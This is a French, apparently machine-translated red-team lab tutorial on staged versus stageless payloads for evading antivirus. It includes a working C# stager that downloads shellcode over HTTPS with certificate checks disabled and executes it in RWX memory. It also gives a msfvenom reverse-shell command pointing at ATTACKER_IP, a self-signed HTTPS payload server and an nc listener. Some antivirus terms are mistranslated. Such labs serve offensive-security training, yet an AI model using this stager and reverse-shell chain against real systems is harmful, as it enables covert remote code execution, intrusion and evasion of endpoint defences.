Dans notre objectif de contourner l' AV , nous trouverons deux approches principales pour fournir le shellcode final à une victime. Selon la méthode, vous constaterez que les charges utiles sont généralement classées en charges utiles échelonnées ou sans étape . Dans cette tâche, nous examinerons les différences entre les deux approches et les avantages de chaque méthode.

## Stageless Payload

Une charge utile sans étape intègre le shellcode final directement dans elle-même. Considérez-le comme une application packagée qui exécute le shellcode en une seule étape. Dans les tâches précédentes, nous avons intégré un exécutable intégrant un simple `calc`shellcode, créant ainsi une charge utile sans étape.

![cad28e045fd6fec615b04d731aef7f9a](https://github.com/dsgsec/Red-Team/assets/82456829/dc4166fb-1291-4353-ae4f-fb3b691ddde2)

Dans l'exemple ci-dessus, lorsque l'utilisateur exécute la charge utile malveillante, le shellcode intégré s'exécute, fournissant un shell inversé à l'attaquant.

## Staged Payload

Les charges utiles échelonnées fonctionnent en utilisant des shellcodes intermédiaires qui agissent comme des étapes menant à l'exécution d'un shellcode final. Chacun de ces shellcodes intermédiaires est appelé stager et son objectif principal est de fournir un moyen de récupérer le shellcode final et de l'exécuter éventuellement.

Bien qu'il puisse y avoir des charges utiles comportant plusieurs étapes, le cas habituel implique d'avoir une charge utile en deux étapes où la première étape, que nous appellerons  stage0 , est un shellcode stub qui se reconnectera à la machine de l'attaquant pour télécharger le shellcode final à utiliser. réalisé.

![f92f294a9e599967a0961b4273381be6](https://github.com/dsgsec/Red-Team/assets/82456829/94c41fe4-6bf3-4c39-a3d1-dc52323a4d3b)

Une fois récupéré, le stub stage0 injectera le shellcode final quelque part dans la mémoire du processus de la charge utile et l'exécutera (comme indiqué ci-dessous).

![fd8a98b3cb79cca98a1e0dfd0292ea61](https://github.com/dsgsec/Red-Team/assets/82456829/5ee0c0c7-661d-486c-808b-8609a5f4297b)

## Staged vs. Stageless

Lorsque nous décidons quel type de charge utile utiliser, nous devons être conscients de l'environnement que nous allons attaquer. Chaque type de charge utile présente des avantages et des inconvénients en fonction du scénario d'attaque spécifique.

Dans le cas de charges utiles sans étage, vous trouverez les avantages suivants :

-   L'exécutable résultant contient tout ce qui est nécessaire pour faire fonctionner notre shellcode.
-   La charge utile s'exécutera sans nécessiter de connexions réseau supplémentaires. Moins il y a d'interactions réseau, moins vous avez de chances d'être détecté par un IPS .
-   Si vous attaquez un hôte avec une connectivité réseau très restreinte, vous souhaiterez peut-être que l'intégralité de votre charge utile soit dans un seul package.

Pour les charges utiles échelonnées, vous aurez :

-   Faible encombrement sur disque. Étant donné que stage0 est uniquement chargé de télécharger le shellcode final, il sera probablement de petite taille.
-   Le shellcode final n'est pas intégré à l'exécutable. Si votre charge utile est capturée, la Blue Team n'aura accès qu'au stub stage0 et rien de plus.
-   Le shellcode final est chargé en mémoire et ne touche jamais le disque. Cela le rend moins susceptible d'être détecté par les solutions audiovisuelles .
-   Vous pouvez réutiliser le même compte-gouttes stage0 pour de nombreux shellcodes, car vous pouvez simplement remplacer le shellcode final qui est servi à la machine victime.

En conclusion, nous ne pouvons pas dire que l'un ou l'autre type est meilleur que l'autre à moins d'y ajouter un peu de contexte. En général, les charges utiles sans étape sont mieux adaptées aux réseaux dotés d'un bon périmètre de sécurité, car elles ne nécessitent pas de télécharger le shellcode final depuis Internet. Si, par exemple, vous effectuez une attaque par chute USB pour cibler des ordinateurs dans un environnement réseau fermé où vous savez que vous n'obtiendrez pas de connexion à votre machine, le mode sans étape est la voie à suivre.

En revanche, les charges utiles échelonnées sont idéales lorsque vous souhaitez réduire au minimum votre empreinte sur la machine locale. Puisqu'ils exécutent la charge utile finale en mémoire, certaines solutions audiovisuelles peuvent avoir plus de mal à les détecter. Ils sont également parfaits pour éviter d'exposer vos shellcodes (dont la préparation prend généralement beaucoup de temps), car le shellcode n'est à aucun moment déposé sur le disque de la victime (en tant qu'artefact).

## Stageurs dans Metasploit

Lorsque vous créez des charges utiles avec msfvenom ou que vous les utilisez directement dans Metasploit, vous pouvez choisir d'utiliser des charges utiles par étapes ou sans étape. À titre d'exemple, si vous souhaitez générer un shell TCP inversé , vous constaterez qu'il existe deux charges utiles à cet effet avec des noms légèrement différents (notez le`_` versus `/`après `shell`) :


| Charge utile                      | Taper                           |
| --------------------------------- | ------------------------------- |
| windows/x64/shell_reverse_tcp<br> | Charge utile sans étape         |
| windows/x64/shell/reverse_tcp<br> | Charge utile échelonnée<br><br> |

Vous constaterez généralement que les mêmes modèles de nom sont appliqués à d'autres types de coques. Pour utiliser un Meterpreter sans scène, par exemple, nous utiliserions le `windows/x64/meterpreter_reverse_tcp`, plutôt que  `windows/x64/meterpreter/reverse_tcp`, qui fonctionne comme son homologue scénique.

##Créer votre propre stager

Pour créer une charge utile intermédiaire, nous utiliserons une version légèrement modifiée du code intermédiaire fourni par [@mvelazc0](https://github.com/mvelazc0/defcon27_csharp_workshop/blob/master/Labs/lab2/2.cs) . Le code complet de notre stager peut être obtenu ici, mais est également disponible sur votre machine Windows à l'adresse `C:\Tools\CS Files\StagedPayload.cs`:

*Code de charge utile complet (cliquez pour lire)*

Le code peut paraître intimidant au premier abord, mais il est relativement simple. Analysons ce qu'il fait étape par étape.

La première partie du code importera certaines fonctions de l'API Windows via P/Invoke. Les fonctions dont nous avons besoin sont les trois suivantes `kernel32.dll`:

| Fonction WinAPI                                                                                                         | Description                                                                                                          |
| ----------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------- |
| [VirtuelAlloc()](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)                | Nous permet de réserver de la mémoire à utiliser par notre shellcode.                                                |
| [CréerThread()](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread) | Crée un fil de discussion dans le cadre du processus en cours.                                                       |
| [Attendre un seul objet()](https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject) | Utilisé pour la synchronisation des threads. Cela nous permet d'attendre la fin d'un fil avant de continuer.<br><br> |

La partie du code en charge de l'import de ces fonctions est la suivante :

```
//https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc
[DllImport("kernel32")]
private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

//https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread
[DllImport("kernel32")]
private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

//https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject
[DllImport("kernel32")]
private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
```

La partie la plus importante de notre code sera dans la `Stager()`fonction, où la logique du stager sera implémentée. La fonction Stager recevra une URL à partir de laquelle le shellcode à exécuter sera téléchargé.

La première partie de la `Stager()`fonction créera un nouvel `WebClient()`objet qui nous permettra de télécharger le shellcode à l'aide de requêtes Web. Avant de faire la demande proprement dite, nous écraserons la `ServerCertificateValidationCallback`méthode en charge de valider les certificats SSL lors de l'utilisation de requêtes HTTPS afin que le WebClient ne se plaigne pas des certificats auto-signés ou invalides, que nous utiliserons dans le serveur Web hébergeant les charges utiles. Après cela, nous appellerons la `DownloadData()`méthode pour télécharger le shellcode à partir de l'URL donnée et le stockerons dans la `shellcode`variable :

```
WebClient wc = new WebClient();
ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

byte[] shellcode = wc.DownloadData(url);
```

Une fois notre shellcode téléchargé et disponible dans la `shellcode`variable, nous devrons le copier dans la mémoire exécutable avant de l'exécuter. Nous avons l'habitude `VirtualAlloc()`de demander un bloc de mémoire au système d'exploitation. Notez que nous demandons suffisamment de mémoire pour allouer `shellcode.Length`des octets et définissons l' `PAGE_EXECUTE_READWRITE`indicateur, rendant la mémoire attribuée exécutable, lisible et inscriptible. Une fois notre bloc mémoire exécutable réservé et affecté à la `codeAddr`variable, nous utilisons `Marshal.Copy()`pour copier le contenu de la `shellcode`variable dans la `codeAddr`variable.

```
UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);
```

Maintenant que nous avons une copie du shellcode allouée dans un bloc de mémoire exécutable, nous utilisons la `CreateThread()`fonction pour générer un nouveau thread sur le processus en cours qui exécutera notre shellcode. Le troisième paramètre passé à CreateThread pointe vers `codeAddr`, où notre shellcode est stocké, de sorte que lorsque le thread démarre, il exécute le contenu de notre shellcode comme s'il s'agissait d'une fonction normale. Le cinquième paramètre est défini sur 0, ce qui signifie que le thread démarrera immédiatement.

Une fois le thread créé, nous appellerons la  `WaitForSingleObject()` fonction pour indiquer à notre programme actuel qu'il doit attendre la fin de l'exécution du thread avant de continuer. Cela empêche notre programme de se fermer avant que le thread shellcode n'ait la possibilité de s'exécuter :

```
IntPtr threadHandle = IntPtr.Zero;
UInt32 threadId = 0;
IntPtr parameter = IntPtr.Zero;
threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);

WaitForSingleObject(threadHandle, 0xFFFFFFFF);
```

Pour compiler le code, nous vous suggérons de le copier sur une machine Windows sous forme de fichier appelé staged-payload.cs et de le compiler avec la commande suivante :

PowerShell

```
PS C:\> csc staged-payload.cs
```

Utiliser notre stager pour exécuter un shell inversé

Une fois notre charge utile compilée, nous devrons configurer un serveur Web pour héberger le shellcode final. N'oubliez pas que notre stager se connectera à ce serveur pour récupérer le shellcode et l'exécuter en mémoire sur la machine victime. Commençons par générer un shellcode (le nom du fichier doit correspondre à l'URL dans notre stager) :

Boîte d'attaque

```
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=7474 -f raw -o shellcode.bin -b '\x00\x0a\x0d'
```

Notez que nous utilisons le format brut pour notre shellcode, car le stager chargera directement tout ce qu'il télécharge en mémoire.

Maintenant que nous avons un shellcode, configurons un simple serveur HTTPS. Tout d'abord, nous devrons créer un certificat auto-signé avec la commande suivante :

Boîte d'attaque

```
user@AttackBox$ openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes
```

Certaines informations vous seront demandées, mais n'hésitez pas à appuyer sur Entrée pour toute information demandée, car nous n'avons pas besoin du certificat SSL pour être valide. Une fois que nous avons un certificat SSL, nous pouvons créer un simple serveur HTTPS en utilisant python3 avec la commande suivante :

Boîte d'attaque

```
user@AttackBox$ python3 -c "import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='localhost.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()"
```

Avec tout cela prêt, nous pouvons maintenant exécuter notre charge utile stager. Le stager doit se connecter au serveur HTTPS et récupérer le fichier shellcode.bin pour le charger en mémoire et l'exécuter sur la machine victime. N'oubliez pas de configurer un écouteur nc pour recevoir le shell inversé sur le même port spécifié lors de l'exécution de msfvenom :

Boîte d'attaque

```
user@AttackBox$ nc -lvp 7474
```
